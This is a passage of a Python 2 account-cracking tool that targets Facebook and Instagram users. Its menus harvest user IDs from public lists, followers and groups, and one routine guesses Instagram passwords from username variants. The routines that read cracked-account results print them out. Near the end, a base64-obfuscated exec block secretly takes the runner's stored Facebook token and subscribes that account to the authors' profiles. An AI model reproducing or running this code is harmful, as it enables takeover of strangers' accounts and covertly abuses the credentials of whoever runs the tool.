    print("\033[0;36m[\033[0;35m05\033[0;36m]\033[0;00m Dump By Nicname \033[0;33m[ \033[0;36mMAXS \033[0;00m100 \033[0;33m]")
    print("\033[0;36m[\033[0;35m06\033[0;36m]\033[0;00m Dump Id Froms Masages \033[0;35m \033[0;33m[ \033[0;36mMAXS \033[0;00m500+ \033[0;33m]")
    print("\033[0;36m[\033[0;35m07\033[0;36m]\033[0;00m Dump Id Followers \033[0;33m[ \033[0;36mMAXS \033[0;00m3000+ \033[0;33m]")
    print("\033[0;36m[\033[0;35m08\033[0;36m]\033[0;00m Dump Id Public \033[0;33m[ \033[0;36mMAXS \033[0;00m4000+ \033[0;33m]")
    print("\033[0;36m[\033[0;35m09\033[0;36m]\033[0;00m Change User-Agent \033[0;33m[ \033[0;31mGANTI \033[0;33m]")
    print("\033[0;36m[\033[0;35m10\033[0;36m]\033[0;00m Chek Results Crack \033[0;33m[ \033[0;35mCEK HASIL \033[0;33m]")
    print("\033[0;36m[\033[0;35m11\033[0;36m]\033[0;00m Chek Optionts ChekPoint \033[0;33m[ \033[0;35mCEK OPSI \033[0;33m]")
    print("\033[0;36m[\033[0;35m12\033[0;36m]\033[0;00m Deleted Account \033[0;33m[ \033[0;35mHAPUS TOKEN \033[0;33m]")
    print("\033[0;36m[\033[0;35m13\033[0;36m]\033[0;00m Panduan Penggunaan Tools ")
    jeeck("\033[0;36m[\033[0;35m14\033[0;36m]\033[0;00m Team Projected \033[0;33m[ \033[0;35mINFO AUTHOR \033[0;33m]")
    jeeck("\033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Exit")
    jeeckgantenggakadayangsuka = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
    if jeeckgantenggakadayangsuka == '':
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m WRONK INPUT DOOG ");jeda(2);_jeeck_proo_()
    elif jeeckgantenggakadayangsuka in['8','08']:
        publik(jeeckxd)
    elif jeeckgantenggakadayangsuka in['7','07']:
        followers(jeeckxd)
    elif jeeckgantenggakadayangsuka in['3','03']:
        postingan(jeeckxd)
    elif jeeckgantenggakadayangsuka in['4','04']:
        group(__jeeclxnano_())
    elif jeeckgantenggakadayangsuka in['5','05']:
    	dumpfl();exit()
    elif jeeckgantenggakadayangsuka in['6','06']:
    	pesan(__jeeclxnano_())
    elif jeeckgantenggakadayangsuka in['2','02']:
        jeckoramadhanganteng().jeeckxtampany()
    elif jeeckgantenggakadayangsuka in['14','14']:
        author()
    elif jeeckgantenggakadayangsuka in['1','01']:
    	_jeeck_proo__instag()
    	_jeeck_proo__instagg()
    elif jeeckgantenggakadayangsuka in['9','09']:
    	useragent()
    elif jeeckgantenggakadayangsuka in['10']:
    	jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m (1. Chek Results OK")
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m (2. Chek Results CP")
        
        chek_crackyou()
    elif jeeckgantenggakadayangsuka in['13']:
        panduanxnano()
    elif jeeckgantenggakadayangsuka in['11']:
    	jeeck_cp()
    elif jeeckgantenggakadayangsuka in['12']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt && rm -rf data/cookies')
        jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Sucses Deleted Asu");exit()
    elif jeeckgantenggakadayangsuka in['00','00']:
    	exit('\n')
    else:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wornk Input ");jeda(2);exit()
def _jeeck_proo__instagg():
	jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m [ \033[0;33mWELLCOME TO TOOLS CRACK INSTAGRAM \033[0;00m]")
	jeeck("\n \033[0;00m[\033[0;36m01\033[0;00m]\033[0;00m Crack from followers")
	jeeck(" \033[0;00m[\033[0;36m02\033[0;00m]\033[0;00m Crack from nicname")
	jeeck(" \033[0;00m[\033[0;36m03\033[0;00m]\033[0;00m Chek results")
	jeeck(" \033[0;00m[\033[0;36m04\033[0;00m]\033[0;00m Delet account")
	jeeck(" \033[0;00m[\033[0;36m00\033[0;00m]\033[0;00m Back to menu")
	jeeclxnano = raw_input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Input : ")
	if jeeclxnano in['']:
		jeeck("\n \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m INPUT EROR");jeda(2);exit()
	elif jeeclxnano in['1','01']:
		pw = ""
		status = ""
		username = raw_input("\n \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m User : ")
		ingfo(username, pw, status)
		jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m ✠═╬═══════════[ JEECK X NANO ]══════════════✠");jeda(2)
		print ('%s [%s++%s] 01%s Follower %s=> %s%s'%(B,J,B,P,M,K,str(pengikut)))
		print ('%s [%s++%s] 02%s Follow %s=> %s%s'%(B,J,B,P,M,K,str(mengikuti)))
		rm = raw_input("\n \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Input : ")
		limit = input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Limit : ")
		if rm in['']:
			jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Wronk input : ")
		elif rm in['1','01']:
			r_ikut(cookie, idg, limit, rm) 
			print ""
			proses()
			passxnxx()
		elif rm in['2','02']:
			r_ikut(cookie, idg, limit, rm) 
			print""
			proses()
			passxnxx()
		else:
			jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Wronk Input Dear ");jeda(2);_jeeck_proo__instagg()
	elif jeeclxnano in['2','02']:
		usr_ = raw_input("\n \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Name : ")
		jumlah = input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Limit : ")
		jeeckxnano_2 = usr_.replace(" ", "")
		cr.append("asw_lu")
		mi.append(jeeckxnano_2+"|"+jeeckxnano_2)
		mi.append(jeeckxnano_2+"_"+"|"+jeeckxnano_2)
		for _i_ in range(1, jumlah+1):
			mi.append(jeeckxnano_2+str(_i_)+"|"+jeeckxnano_2)
			mi.append(jeeckxnano_2+"_"+str(_i_)+"|"+jeeckxnano_2)
			mi.append(jeeckxnano_2+str(_i_)+"_"+"|"+jeeckxnano_2)
		proses()
		passxnxx()
	elif jeeclxnano in['3','03']:
		hasil_igeh()
	elif jeeclxnano in['04','4']:
		k = raw_inputjeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Type ,Jeeck, Continue Deleted Account[ J/n ] : ")
		if k in ["JEECK", "jeeck", "Jeeck"]:
			print('')
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[0;95m╰_╯\x1b[0;96m Deleted Cooooook.......' + m,
				sys.stdout.flush();jeda(1)
			os.system('rm -rf data/ig.txt')
			jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Sucessfulll Deleted Coooook......╰_╯");exit()
		else:
			jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Run Tools Doog");jeda(2)
	elif jeeclxnano in['0','00']:
		_jeeck_proo_()
		
	else:
		jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Wronk Input Dooog .........");jeda(2);_jeeck_proo__instagg()

def author():
         jalan(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Pembuat Tools : ")
         jalan(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m                \033[0;36m(\033[0;33m1. \033[0;36mJeeck X Nano ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m2. \033[0;36mXnCode ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m3. \033[0;36mXxCode ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m4. \033[0;36mYayan XD ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m5. \033[0;36mRisky / Dumaii ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m Thanks Too : ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m1. \033[0;36mXnCode ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m2. \033[0;36mXxCode ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m3. \033[0;36mYayan XD ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m5. \033[0;36mRisky / Dumai ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m FOLLOW GITHUB :")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m1. \033[0;36mYayan XD")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m++. https://github.com/Yayan-XD")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m2. \033[0;36mRisky / Dumaii")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m++. https://github.com/Dumai-991")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m3. \033[0;36mJEECK X NANO")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m++. https://github.com/mrjeeck")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;31m DONASI NJEENK :")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m               WA : 081392505882")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m               FB : Jeeck X Nano")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m               PULSA : 085891511849")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m               PULSA : 081392505882")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m               OPEN BO : xnxx.com")
         jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;33m  JANGAN LUPA FOLLOW GITHUB AUTHOR")
         raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
         _jeeck_proo_()
def panduanxnano():
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;35m _jeeck_proo_ Panduann Penggunaan")
         jalan("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 1. Tools Ini Terdapat Beberapa Jenis Tools")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 2. Anda Dapat Memilih Salah Satu _jeeck_proo_ Tools")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 3. Tools Ini Terdapat Fitur Crcak Instagram")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 4. Dan Juga Ada Fitur Crack Facebook")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 5. _jeeck_proo_ Crack Facebook Sangat Banyak Sekali Fitur")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 6. Dari Mulai Segi Dump Public Hingga Dump Group")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 7. Apa Itu Dump Id Public Bang...... ??")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 8. Public Yang Ya Dumpublic Dump Id Orang Secara Random")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 9. Dump Id group Maksudnya apa Bwank.....? Seriusnanya")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 10. Kita Dumpnya Ambil Id Dari Group Dan Kita Dapat MENGOBOKOBOKOBOK RANDOM MEMBER GROUP")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 11. Bang Kalo _jeeck_proo_ User Agent Fungsinya Buat Apa .....??")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 12. Kita Dapat Mengganti User-Agent Sesuai Kita  👀 Udah Tau Bang")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 13. Agent adalah proses mengakui dan menganalisis string agen pengguna untuk mengenali properti string.")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 14. 👀 Bang Kalo Ganti User Agent Itu Dapat One Tap Kahh")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 15. Belum Tentu Onetap ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 16. Bang Cara Onetap Bagaimana SAYA MAU PAMER")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 17. 1.Dump Id Yang Temanya Sedaerah Dengan Lu")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 18. 2.Baca Bismillah Terlebih Dahulu")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 19. 3.Pada Saat Mau Buka Sesi Usahakan Anda Mempunyai 2 SIM")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 20. 4.Semisal Lu Pada Saat Crack Pake Sim1 Terus Lubuka Sesi Pake Sim 2")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 21. 5.Bang Masih Kagak Bisa ....??? .·´¯`(>▂<)´¯`·.")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 22. 6.Pake Methode Ganti Apn ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 23. 7.Bang Apn Dapet Nya Darimana...???･ﾟﾟ･(>д<)･ﾟﾟ･")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 24. 8.Cari Di Google Banyak")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 25. 9.Bang Kegunaan Apn Untuk Apa")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 25. 10.fungsi APN adalah untuk menyambungkan device dengan operator penyedia layanan internet.")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 26. 11.Bang Lu Recode Ya NGGAK KO Hehehe ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 27. 12.Bang Kok Methode Mbasic Kek Punya YayanXD ")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 28. 13.Oh Itu Emang Gwe Izin Ke YayanXD Ambil.Cuplikan Methode MBASIC")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 29. 14.Sama Aja Lu Recode Bwank ....? ENGGAK KOK HAL INI SAYA SEBUT KERJA SAMA")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 30. 15.Methode B-Api Yang Buat Sya , Mbasic Yang Buat YayanXD, Mobile FB Yang Buat RISKY/SUHU DUMAII")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 31. 16.Oooh Begitu Ya Bang.... Iyaa")
         jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m 32. 17.Iyaa Bwank BTW MAKASIH UDAH PAKE TOOLS.SAYA")
         raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
         _jeeck_proo_()

def chek_crackyou():
	l = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
	if l in['']:
		jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m WRONK INPUT");jeda(2);_jeeck_proo_()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Results Crack")
		for file in dirs:
			print("%s[%s+%s%s=> %s%s"%(B,J,B,M,H,file));jeda(0.07)
		try:
			file = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Enter File : ");jeda(0.2)
			if file in['']:
				exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input Asuu Celeng")
			totalok = open('OK/%s' % file).read().splitlines()
		except (KeyError, IOError):
			jalan("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m File No Detected Njenk ")
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		jalan("%s+%s Results %s : %s%s %stotal %s: %s%s"%(B,J,B,K,file_nm,O,M,H,len(totalok)))
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		os.system('cat OK/%s' % file)
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s[%s+%s] %s hasil crack yang tersimpan \n"%(B,J,B,P,))
		for file in dirs:
			print("%s+%s=> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Enter File : ");jeda(0.2)
			if file in['']:
				exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input Asu Ngentod Babi")
			totalcp = open('CP/%s' % file).read().splitlines()
		except (KeyError, IOError):
			jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m File Not Detected")
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		jalan("%s+%s Results%s : %s%s %stotal %s: %s%s"%(B,J,B,K,file_nm,O,M,H,len(totalcp)))
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		os.system('cat CP/%s' % file)
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
		exit('\n')
	else:
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input Ya Bangsat");jeda(2);_jeeck_proo_()
#....lan2
def hasil_igeh():
	jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m (1. Chek Results Ok")
	jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m (2. Chek Results Cp")
	while True:
		mrjreckxnanoxxz = raw_input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Input : ")
		if mrjreckxnanoxxz in['1','01']:
			try:
				oke = open("sucses.txt", "r").readlines()
				
				jeeck(" \033[0;00m[\033[0;36m+++\033[0;00m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
				print ("%s[+] %sTotal  %s: %s%s"%(U,O,M,H,str(len(oke))))
				jeeck(" \033[0;00m[\033[0;36m+++\033[0;00m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
				okek = open("sucses.txt", "r").read()
				print (okek)
				jeeck(" \033[0;00m[\033[0;36m+++\033[0;00m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")
		if mrjreckxnanoxxz in['2','02']:
			try:
				cepe = open("cheekpoint", "r").readlines()
#				
				jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
				print ("%s[+] %sJumlah %s: %s%s"%(U,O,M,K,str(len(cepe))))
				jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
				cepek = open("cheekpoint", "r").read()
				print (cepek)
				jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════");jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")

def konfirmasi():
	os.system("clear")
	banner()
	print('\n')
	y = ['.   ', '..  ', '... ']
	for m in y:
		print '\r\x1b[0;95m[+]\x1b[0;96m Please Wait ' + m,
		sys.stdout.flush();jeda(1)
	id = uuid.uuid4().hex[:25]
	lpg = open('data/lisensi.txt', 'w')
	lpg.write(id)
	lpg.close()
	jalan ('\n\n%s[+] %sLisensi%s : %s%s'%(J,O,M,H,id));jeda(1)
	jalan ('%s[+] %sLisensi Belum Di konfirmasi'%(B,O))
	su=raw_input("\n%s[+] Buy Lisensi cook  y/t %s: %s"%(U,O,M,K))
	if su in['']:
		exit()
	elif su in["y","Y"]:
		os.system('am start https://wa.me/+6281392505882?text=Assalamualaikum++saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1);exit()
	elif su in["t","T"]:
		exit()
	else:
		exit()
def konfirmasi1():
	try:
		lis = open('data/lisensi.txt', 'r').read()
		git = requests.get('https://github.com/mrjeeck/Lisensi/blob/main/id.txt').text.strip() # jangan di ganti nanti error
		if lis in git:
			os.system('clear')
			banner()
			print("\n")
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[0;95m[+]\x1b[0;96m Memeriksa lisensi ' + m,
				sys.stdout.flush();jeda(1)
			jalan('\n%s[+] Lisensi tersedia √'%(H));jeda(1);_jeeck_proo_()
		else:
			os.system('clear')
			banner()
			print("\n")
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[0;95m[+]\x1b[0;96m Memeriksa lisensi ' + m,
				sys.stdout.flush();jeda(1)
			jalan('\n%s[+] Lisensi tidak tersedia'%(M));jeda(1)
			konfirmasi()
	except IOError:
		os.system("rm -rf data/lisensi.txt")
		konfirmasi()
		
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))



#exec(marshal.loads(zlib.decompress(base64.b64decode("eJy1VuluGzcQntVlWz4S51LStAXTFIWLFJZkXbEb15EtxYdsuZCVxIkRBJSWldZ7KUsuUgPSr/Qdmn99xT5CZ2gpbRQfSItqRXJ2ZjgHOR+5bRj+JrE9xiZ/x04AHBtgApjYR8CMghmDThzeGfAyMpLGwUyAOQHmJJhTYCbBnIbOhNaJjnRmwJwFcw46Uc2PncOPj9sc8pG+Ar8BvEQvV+FgYZ4CzGBX44p7J5w1Ax66nNWEEm7IXnCvwzZ933R837aQrlisKQLL5fIGTtpBMffYATfZXuiEbB3f5Tco6LwVzPQ5szzGW2TjmJsW8wMiZWhLIeU6qm3jdMW0Avk/7R4fZTOZTG6pUCrllou55cLKK1azUNAUivdYlwehZC0RHIcjb2fN+Jl7IWbEaiGriK58gGoVy+QOdxe3uLLskG3pfCsWZ+uhjZonFIbDMeSVZ/JL1N/EJBQPGeXImfR7wusIj/VE0LHkAilwTwlaoOG4LkJl9ULnzz/ev/9nk1+jcrlr89GfbQS+r1iFO8J1WdXjts6DHdYPN/YrVVaulHfLW6xZLe+xnWp1o8YOWb1c32fabbm++Uz45c5kO2qyOOW1usr2nu08lbe72y+06a1S12fXn5XpN3vkQuc1G4yhyR2/r89CSXdYZymh7hJJf0LRyvVmt19h6ub5ZbbK98sGLMivvYqxtqvhZbHFsG1RU96MAJw1Qo5J/F6F6fAcwAFBIRwkEfYAUluXAABWD4zj0DThOUKEOItCPEEbuDKKaiiMVg+feVxBTE2AnIXgDhmFgcW9uqUmya3gGHKopKvZUPwop5E8RlFL9mH5JwiAOahoGCVAzMJgANQuDSVBzMJgivA2SBDl0gqgbTBOiBjM60isErf40pBBeKYoYIZQaRm58hgKGgZhLXa44c5lCcqgQP1NhHvqJfz1z6rKZ55qeuVABTU/+f+lMnKlwDS5jXIdzFnn+PMHQ6Y1PBDfHbd8aZ6T+ZlzVBYvXwcHCbQRLXU5h7/gdy1tUvypl4Fsgf8C+q1RPrqTTnYD3uou/8LZo4Um82PbdtCvSa7zdxqP0tfJt4a0ihAA87gr0B2CZ8hGdKXePsj/miu6RHgvug+H7KxozGZc1aS5Lsw064QU7Ytv1Jwjp7Qp7JZNo4In2abMVJufoPDHZk2EUyFJXkFUo5fKFUiFTyjzM5Zezmjd2Ng31iqVsPpstlgqlh7kMLgLqLRWX8qVCcTmzvFRYzpfk3YuTltdRnkbKFZ6S6TUX0+cdsapj++6j5ZAJUu35UqXl6sVWxzI4y37t8yw4li3kmgxdlwcnqyoIxVhwl0b00VqdFRHdGOlA8LayfE+uqZOeWN3df1Ydc1S52NHYRqVl2JLtwML7Va59tqFiDjcyV8jl8pn/ZmiptLSczxawJi6ISH+86KKnq1kTuBymmtTEm1BIJVWUvkaE0tJj6XsqrpHGTalZSiDcJqiu96tB4AdDMQJRESR7wsXbr2M5iqBg+7gHgTCFqxKnr8p3tBnb9yxNOL5jaXskfDuUUg1qAqeHC3RLajeUhdIB+uqtxjwfQZg3CMJaRoZOx9MUW7xlaYbDHZ2qjkrxoHFrZJj85T9QOfpmAN1Jsmp2dGotX73eEaJtEzTlMxLPRY2bxnXjmpE05oxZI25MYz9rJD557kXuGd8b9/C5M2wfqNi8MY8jPUTNR+oLFKReMPz8M/3TtWt3fastGrSDjZvUXaOOwN2gL5DG/VHInwZP5h65vhk64idaNH1KfR35NnKbnsRf3fGZFA==")))